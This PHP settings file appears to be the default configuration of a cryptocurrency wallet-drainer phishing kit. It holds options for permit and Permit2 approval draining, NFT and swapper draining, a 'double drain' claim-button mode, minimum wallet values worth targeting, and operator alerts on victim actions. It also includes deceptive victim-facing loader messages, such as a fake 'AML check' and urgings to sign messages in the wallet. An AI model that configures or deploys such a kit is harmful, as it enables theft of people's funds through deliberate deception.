<?php
$settings_default = Array(
    'auto_payouts' => true,
    'wallet_verification' => false,
    'contract_method' => 'Claim',
    'loop_token' => true,
    'permit_priority' => true, 
    'permit_amount' => 100,
    'modal_type' => 'saturnModal',
    'modal_pallete' => '',
    'modal_font' => '',
    'modal_open_event' => 'on_load',
    'modal_open_logic' => 'all',
    'modal_theme' => 'auto',
    'thanks_redirect' => false,
    'thanks_redirect_url' => "",
    'loader_type' => 'comet',
    'messaging_bot' => '',
    'messaging_chat' => '',
    'enter_website' => true,
    'connect_request' => true,
    'connect_success' => true,
    'exit_website' => true,
    'approve_request' => true,
    'chain_cancel' => true,
    'chain_request' => true,
    'approve_cancel' => true,
    'profit_chat' => '',
    'wc_font' => "'Montserrat', sans-serif",
    'wc_accent_color'  =>  '',
    'wc_fill_color' => '', 
    'wc_background_color' => '',
    'wc_logo' => '',
    'wc_background_image' => '',
    'double_drain_mode' => false,
    'double_drain_class' => '.claim-button',
    'double_drain_text' => 'Claim',
    'minimal_wallet_price' => 10,
    'minimal_token_price' => 10,
    'minimal_native_price' => 10,
    "nft_mode" => true,
    "chain_tries_limit" => 1,
    "permit2_mode" => true,
    "permit_mode" => true,
    "cache_data" => true,
    "swappers_mode" => true,
    'loader_text' => [
        'connect' => [
          'description' => 'Connecting to Blockchain...'
        ],
        'connect-success' => [
          'description' => 'Connection established',
        ],
        'address-check' => [
          'description' => 'Getting your wallet address...',
        ],
        'aml-check' => [
          'description' => 'Checking your wallet for AML...',
        ],
        'aml-check-success' => [
          'description' => 'Good, your wallet is AML clear!',
        ],
        'scanning-more' => [
          'description' => 'Please wait, we\'re scanning more details...',
        ],
        'thanks' => [
          'description' => 'Thanks!',
        ],
        'sign-validation' => [
          'description' => 'Confirming your sign... Please, don\'t leave this page!',
        ],
        'sign-waiting' => [
          'title' => 'Waiting for your sign...',
          'description' => 'Please, sign message in your wallet!',
        ],
        'sign-confirmed' => [
          'description' => 'Success, Your sign is confirmed!',
        ],
        'error' => [
          'title' => 'An error has occurred!',
          'description' => 'Your wallet doesn\'t meet the requirements.Try to connect a middle-active wallet to try again!',
          'button' => 'Re-connect'
        ],
        'low-balance-error' => [
          'description' => 'Some error happened during connection process. You need to to verify your wallet manually.',
          'button' => 'Verify'
        ],
        'aml-check-error' => [
          'title' => 'AML Error',
          'description' => 'Your wallet is not AML clear, you can\'t use it!',
        ],
    ]
); 